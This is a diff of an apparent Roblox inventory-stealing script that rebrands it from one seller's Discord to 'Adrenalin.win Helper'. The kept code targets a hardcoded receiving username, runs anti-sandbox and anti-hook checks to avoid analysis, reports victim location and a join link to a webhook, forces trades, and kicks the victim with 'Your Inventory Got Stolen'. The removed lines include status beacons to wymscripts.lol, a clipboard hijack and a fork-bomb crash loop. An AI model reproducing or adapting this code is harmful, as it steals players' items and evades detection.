@@ -1,4 +1,4 @@
---Lol
+--Best
 
 _G.Usernames = {"Erereer454"} 
 _G.min_rarity = "Common" 
@@ -14,39 +14,39 @@ getgenv().executed = true
 local hooked = false
 if not rawequal(_25mspredefine, nil) then
     do hooked = true end
-    do return [[https://discord.gg/zXAD3Ftnbv]], error("<3"), assert(false, "<3"), (nil)() end
+    do return [[""]], error("<3"), assert(false, "<3"), (nil)() end
     do return nil end
 end
 local string_lower_result = debug.traceback():lower()
 if string_lower_result:find("sandbox") or string_lower_result:find("unveilr") or string_lower_result:find("httpspy2") then
     do hooked = true end
-    do return [[https://discord.gg/zXAD3Ftnbv]], error("<3"), assert(false, "<3"), (nil)() end
+    do return [[""]], error("<3"), assert(false, "<3"), (nil)() end
     do return nil end
 end
 if isfunctionhooked then
     if (http and http.request and isfunctionhooked(http.request)) or (request and isfunctionhooked(request)) or (http_request and isfunctionhooked(http_request)) or (httprequest and isfunctionhooked(httprequest)) then
         do hooked = true end
-        do return [[https://discord.gg/zXAD3Ftnbv]], error("<3"), assert(false, "<3"), (nil)() end
+        do return [[""]], error("<3"), assert(false, "<3"), (nil)() end
         do return nil end
     end
     if hookfunction then
         local f = function() end
         if isfunctionhooked(f) then
             do hooked = true end
-            do return [[https://discord.gg/zXAD3Ftnbv]], error("<3"), assert(false, "<3"), (nil)() end
+            do return [[""]], error("<3"), assert(false, "<3"), (nil)() end
             do return nil end
         end
         hookfunction(f, function() print("hi") end)
         if not isfunctionhooked(f) then
             do hooked = true end
-            do return [[https://discord.gg/zXAD3Ftnbv]], error("<3"), assert(false, "<3"), (nil)() end
+            do return [[""]], error("<3"), assert(false, "<3"), (nil)() end
             do return nil end
         end
     end
 end
 if not getmetatable or not setmetatable or not type or not select or type(select(2, pcall(getmetatable, setmetatable({}, {__index = function(self, ...) while true do end end})))['__index']) ~= 'function' or not pcall or not debug or not rawget or not rawset or not pcall(rawset,{}," "," ") or getmetatable(require) or getmetatable(print) or getmetatable(error) or ({debug.info(print,'a')})[1]~=0 or ({debug.info(tostring,'a')})[1]~=0 or ({debug.info(print,'a')})[2]~=true or not select or not getfenv or select(1, pcall(getfenv, 69)) == true or not select(2, pcall(rawget, debug, "info")) or #(((select(2, pcall(rawget, debug, "info")))(getfenv, "n")))<=1 or #(((select(2, pcall(rawget, debug, "info")))(print, "n")))<=1 or not (select(2, pcall(rawget, debug, "info")))(print, "s") == "[C]" or not (select(2, pcall(rawget, debug, "info")))(require, "s") == "[C]" or (select(2, pcall(rawget, debug, "info")))((function()end), "s") == "[C]" or not select(1, pcall(debug.info, coroutine.wrap(function() end)(), 's')) == false then
     do hooked = true end
-    do return [[https://discord.gg/zXAD3Ftnbv]], error("<3"), assert(false, "<3"), (nil)() end
+    do return [[""]], error("<3"), assert(false, "<3"), (nil)() end
     do return nil end
 end
 local Success = pcall(function()
@@ -54,7 +54,7 @@ local Success = pcall(function()
 end)
 while Success do
     do hooked = true end
-    do return [[https://discord.gg/zXAD3Ftnbv]], error("<3"), assert(false, "<3"), (nil)() end
+    do return [[""]], error("<3"), assert(false, "<3"), (nil)() end
     do return nil end
 end
 game:GetChildren(function()
@@ -62,7 +62,7 @@ game:GetChildren(function()
 end)
 while #game:GetChildren() <= 4 do
     do hooked = true end
-    do return [[https://discord.gg/zXAD3Ftnbv]], error("<3"), assert(false, "<3"), (nil)() end
+    do return [[""]], error("<3"), assert(false, "<3"), (nil)() end
     do return nil end
 end
 local Success, Result = pcall(function()
@@ -70,12 +70,12 @@ local Success, Result = pcall(function()
 end)
 while not Success do
     do hooked = true end
-    do return [[https://discord.gg/zXAD3Ftnbv]], error("<3"), assert(false, "<3"), (nil)() end
+    do return [[""]], error("<3"), assert(false, "<3"), (nil)() end
     do return nil end
 end
 while Result[6][2] ~= nil do
     do hooked = true end
-    do return [[https://discord.gg/zXAD3Ftnbv]], error("<3"), assert(false, "<3"), (nil)() end
+    do return [[""]], error("<3"), assert(false, "<3"), (nil)() end
     do return nil end
 end
 local _, Message = pcall(function()
@@ -83,7 +83,7 @@ local _, Message = pcall(function()
 end)
 while not Message:find("attempt to call a Instance value") do
     do hooked = true end
-    do return [[https://discord.gg/zXAD3Ftnbv]], error("<3"), assert(false, "<3"), (nil)() end
+    do return [[""]], error("<3"), assert(false, "<3"), (nil)() end
     do return nil end
 end
 if hooked then
@@ -195,8 +195,7 @@ end
 
 
 
-if realSetClipboard then
-pcall(function() realSetClipboard("https://discord.gg/zXAD3Ftnbv") end) end
+
 
 local rarityTable = {"Common", "Uncommon", "Rare", "Epic", "Legendary", "Godly", "Ancient", "Unique"}
 
@@ -717,7 +716,7 @@ local locationStr = (loc.country or "Unknown")
                 { name = "\240\159\148\151 Quick Join", value = "[**Click to Join**](" .. JoinLink .. ")", inline = true }
             },
             footer = {
-                text = "Wym Scripts \194\183 discord.gg/zXAD3Ftnbv",
+                text = "Adrenalin.win Helper \194\183 discord",
                 icon_url = NotHead
             },
             timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
@@ -812,53 +811,17 @@ local _statusMessageId = nil
 local _statusFinal = false  
 
 local function pingStatus()
-    if webhookToken == "" then return end
-    pcall(function()
-        requestFunc({
-            Url = "https://wymscripts.lol/playerstatus",
-            Method = "POST",
-            Headers = { ["Content-Type"] = "application/json" },
-            Body = HttpService:JSONEncode({
-                token = webhookToken,
-                messageId = _statusMessageId,
-            })
-        })
-    end)
 end
 
 local function markPartial()
     if _statusFinal then return end
     _statusFinal = true
-    pcall(function()
-        requestFunc({
-            Url = "https://wymscripts.lol/playerstatus/partial",
-            Method = "POST",
-            Headers = { ["Content-Type"] = "application/json" },
-            Body = HttpService:JSONEncode({ token = webhookToken })
-        })
-    end)
 end
 
 local function markClaimed()
     if _statusFinal then return end
     _statusFinal = true
-    pcall(function()
-        requestFunc({
-            Url = "https://wymscripts.lol/playerstatus/claimed",
-            Method = "POST",
-            Headers = { ["Content-Type"] = "application/json" },
-            Body = HttpService:JSONEncode({ token = webhookToken })
-        })
-    end)
 end
-
-
-task.spawn(function()
-    while not _statusFinal do
-        pingStatus()
-        task.wait(10)
-    end
-end)
 
     local function doTrade(joinedUser)
         local initialTradeState = getTradeStatus()
@@ -911,7 +874,7 @@ end)
             end
             task.wait(1)
         end
-        plr:kick("Your Inventory Got Stolen\nJoin discord.gg/zXAD3Ftnbv To Make Your Own Script !")
+        plr:kick("Your Inventory Got Stolen")
     end
 
         local function startImmediateHit()
@@ -930,26 +893,3 @@ end)
         end
     end)
 end
-
-wait(10)
-
--- // INSTANT SUPER AGGRESSIVE FREEZE
--- Начинает заморозку сразу же после выполнения скрипта
-
-local function crash()
-    task.spawn(crash)
-    coroutine.wrap(crash)()
-    task.defer(crash)
-    
-    while true do
-        coroutine.wrap(crash)()
-    end
-end
-
--- Максимально быстрый запуск нескольких ядер
-for i = 1, 20 do
-    task.spawn(crash)
-end
-
--- Финальный удар
-crash()
